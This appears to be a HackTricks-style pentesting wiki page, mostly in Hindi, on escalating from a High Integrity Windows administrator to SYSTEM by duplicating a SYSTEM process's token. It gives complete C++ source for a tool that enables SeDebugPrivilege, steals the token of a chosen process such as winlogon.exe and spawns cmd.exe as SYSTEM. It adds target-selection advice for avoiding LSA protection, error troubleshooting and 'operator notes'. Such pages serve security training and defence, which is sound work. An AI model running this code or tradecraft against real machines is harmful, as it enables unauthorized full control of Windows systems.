# SeImpersonate from High To System

{{#include ../../banners/hacktricks-training.md}}

यह पेज **manual** वर्ज़न के बारे में है, जिसमें **High Integrity administrator process** से **`NT AUTHORITY\SYSTEM`** तक जाने के लिए **एक non-protected SYSTEM process खोलना, उसका token duplicate करना, और उस token के साथ child process spawn करना** शामिल है।

अगर आपके पास सिर्फ **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** है लेकिन आप **कोई suitable SYSTEM process open नहीं कर सकते**, तो **Potato / named-pipe** path आमतौर पर ज़्यादा reliable होता है:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

अगर आपको सिर्फ `SYSTEM` नहीं, बल्कि **जितने हो सकें उतने privileges वाला SYSTEM token** चाहिए, तो यह भी देखें:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Quick triage

token steal करने से पहले, context को जल्दी से validate करें:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
व्यावहारिक नोट्स:

- एक **High Integrity** admin token आमतौर पर **`SeDebugPrivilege` सक्षम** करने और कई non-protected SYSTEM processes खोलने के लिए पर्याप्त होता है।
- **`CreateProcessWithTokenW` को caller पर `SeImpersonatePrivilege` चाहिए**। अगर यह API `1314` के साथ fail होती है, तो पहले एक SYSTEM primary token duplicate करने के बाद `CreateProcessAsUserW` पर switch करें।
- आधुनिक Windows पर, **`lsass.exe` अक्सर bad target होता है** क्योंकि **LSA protection / PPL** administrators के लिए भी, भले `SeDebugPrivilege` हो, access block कर देता है। **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, या SYSTEM के रूप में चल रहा कोई early **`svchost.exe`** prefer करें।
- हर SYSTEM process का token equally useful नहीं होता। अगर आपको SYSTEM मिल जाए लेकिन missing privileges दिखें, तो technique broken मानने के बजाय किसी दूसरे SYSTEM process को try करें।

## PID carefully चुनें

इसको reliably काम कराने का सबसे आसान तरीका है **ऐसा SYSTEM process चुनना जिसकी DACL वास्तव में Administrators को process query करने और उसका token duplicate करने दे**।

पहले test करने के लिए अच्छे candidates:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- SYSTEM के रूप में चल रहे कुछ early `svchost.exe` instances

Default रूप से avoid करें:

- जिन hosts पर **RunAsPPL / LSA protection** enabled हो, वहाँ `lsass.exe`
- protected / security-sensitive processes जो **`SeDebugPrivilege` सक्षम करने के बाद भी** `Access denied` देते हैं

आप elevated **Process Explorer** या **Process Hacker** से candidate processes और उनके token/ACLs inspect कर सकते हैं।

### Code

[यहाँ](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962) से लिया गया निम्न code। यह **argument के रूप में एक Process ID indicate** करने देता है और indicated process के user के रूप में चलने वाला एक CMD **run** करेगा।\
High Integrity process में run करते समय आप **System के रूप में चल रहे process का PID** (जैसे `winlogon`, `wininit`) indicate कर सकते हैं और `cmd.exe` को SYSTEM के रूप में execute कर सकते हैं।
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Useful API / access-right notes

sample `MAXIMUM_ALLOWED` का उपयोग करता है, लेकिन real operations के लिए minimum pieces याद रखना उपयोगी है:

- `OpenProcessToken()` को केवल यह चाहिए कि **process handle** को **`PROCESS_QUERY_LIMITED_INFORMATION`** के साथ open किया गया हो।
- `CreateProcessWithTokenW()` का उपयोग करने के लिए, **primary token handle** के पास **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`** होना चाहिए।
- `DuplicateTokenEx()` को एक **primary token** (`TokenPrimary`) बनाना चाहिए, केवल impersonation token नहीं।
- अगर आपने पहले ही SYSTEM impersonate कर लिया है और `CreateProcessWithTokenW()` फिर भी `1314` के साथ fail होता है, तो इसके बजाय `CreateProcessAsUserW()` try करें।

इसका मतलब है कि **target process को `PROCESS_ALL_ACCESS` के साथ open करना आमतौर पर unnecessary और more noisy होता है**; इसके बजाय token query करने के लिए जरूरी rights ही request करना बेहतर है।

## Error

कुछ मामलों में आप System impersonate करने की कोशिश कर सकते हैं और यह काम नहीं करेगा, तथा निम्न जैसा output दिखेगा:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
इसका मतलब है कि भले ही आप High Integrity level पर चल रहे हों, **आपके पास उस target process/token पर पर्याप्त permissions नहीं हैं**।\
आइए **Process Explorer** (या आप **Process Hacker** भी इस्तेमाल कर सकते हैं) के साथ `svchost.exe` processes पर current Administrator permissions देखें:

1. `svchost.exe` का एक process select करें
2. Right Click --> Properties
3. "Security" Tab के अंदर bottom right में "Permissions" button पर click करें
4. "Advanced" पर click करें
5. "Administrators" select करें और "Edit" पर click करें
6. "Show advanced permissions" पर click करें

![Code - Error: 6. Click on "Show advanced permissions"](<../../images/image (437).png>)

पिछली image में वह सभी privileges हैं जो selected process पर "Administrators" के पास हैं (जैसा कि आप देख सकते हैं, `svchost.exe` के case में उनके पास केवल "Query" privileges हैं)

`winlogon.exe` पर "Administrators" के पास जो privileges हैं, उन्हें देखें:

![Code - Error: See the privileges "Administrators" have over winlogon.exe](<../../images/image (1102).png>)

उस process के अंदर "Administrators" के पास "Read Memory" और "Read Permissions" हैं, जो संभवतः Administrators को इस process द्वारा इस्तेमाल किए गए token को impersonate करने की अनुमति देता है।

### Common failure causes

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: process DACL आपको block कर रहा है, या target **protected/PPL** है। कोई दूसरा SYSTEM process चुनें।
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: आपका token handle पर्याप्त rights के बिना open किया गया था, या target token DACL duplication को रोकता है।
- **`CreateProcessWithTokenW()` -> `1314`**: caller के पास अभी **`SeImpersonatePrivilege`** enabled नहीं है। पहले उसे enable करने की कोशिश करें या duplicated primary token के साथ `CreateProcessAsUserW()` use करें।
- **`CreateProcessWithTokenW()` -> `1326`** पिछले failures के बाद: इसका अक्सर मतलब सिर्फ यह होता है कि earlier token duplication/impersonation step fail हो गया, इसलिए child process launch करने के लिए कोई usable primary token नहीं है।

## Operator notes

- यह technique तब बहुत अच्छी है जब आप पहले से **local admin + high integrity** हैं और service या named-pipe coercion chain शुरू किए बिना SYSTEM तक जल्दी, manual path चाहते हैं।
- Hardened Windows 11 / Server environments पर, **LSA protection** increasingly common है, इसलिए ऐसा workflow जो मानता है कि `lsass.exe` हमेशा readable होगा, brittle है। **`winlogon.exe` / `wininit.exe` / `services.exe`** आमतौर पर बेहतर first picks हैं।
- अगर आप elevated admin desktop की बजाय **service account** context में पहुँचते हैं, तो इस page की तुलना में **Potato family** आमतौर पर बेहतर fit होती है।



## References

- [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
{{#include ../../banners/hacktricks-training.md}}
